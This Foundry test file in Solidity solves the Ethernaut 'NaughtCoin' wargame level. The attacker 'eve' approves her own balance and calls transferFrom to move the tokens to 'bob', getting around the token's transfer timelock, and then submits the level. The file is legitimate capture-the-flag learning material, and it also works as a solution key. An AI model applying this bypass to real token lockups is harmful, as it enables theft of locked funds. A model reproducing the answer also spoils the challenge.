// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Ethernaut game components
import {Ethernaut} from "src/core/Ethernaut-08.sol";
import {NaughtCoinFactory, NaughtCoin} from "src/levels/15-NaughtCoin/NaughtCoinFactory.sol";

contract NaughtCoinTest is Test {
    /*//////////////////////////////////////////////////////////////
                            GAME INSTANCE SETUP
    //////////////////////////////////////////////////////////////*/

    Ethernaut ethernaut;

    /// @dev eve is the attacker
    address eve = makeNameForAddress("eve");
    address bob = makeNameForAddress("bob");

    function setUp() public {
        emit log_string("Setting up NaughtCoin level...");
        ethernaut = new Ethernaut();
    }

    /*//////////////////////////////////////////////////////////////
                LEVEL INSTANCE -> EXPLOIT -> SUBMISSION
    //////////////////////////////////////////////////////////////*/

    function test_NaughtCoinExploit() public {
        /*//////////////////////////////////////////////////////////////
                            LEVEL INSTANCE SETUP
        //////////////////////////////////////////////////////////////*/

        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();

        ethernaut.registerLevel(naughtCoinFactory);

        vm.startPrank(eve);
        address levelAddress = ethernaut.createLevelInstance(naughtCoinFactory);

        NaughtCoin naughtCoinContract = NaughtCoin(levelAddress);

        emit log_string("Starting the exploit...");
        emit log_named_address("Eve's address", eve);

        /*//////////////////////////////////////////////////////////////
                                LEVEL EXPLOIT
        //////////////////////////////////////////////////////////////*/

        naughtCoinContract.approve(
            eve,
            naughtCoinContract.balanceOf(address(eve))
        );

        naughtCoinContract.transferFrom(
            address(eve),
            address(bob),
            naughtCoinContract.balanceOf(eve)
        );

        /*//////////////////////////////////////////////////////////////
                                LEVEL SUBMISSION
        //////////////////////////////////////////////////////////////*/

        bool challengeCompleted = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(challengeCompleted);
    }

    /*//////////////////////////////////////////////////////////////
                            HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * I've found this useful function
     * in github/twpony Ethernaut repo
     * @notice This function allows for creating labels (names) for addresses
     * which will improve readability in traces
     * @param name you pass the name like "alice" or "bob" and it will create
     * an address for that person
     */
    function makeNameForAddress(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
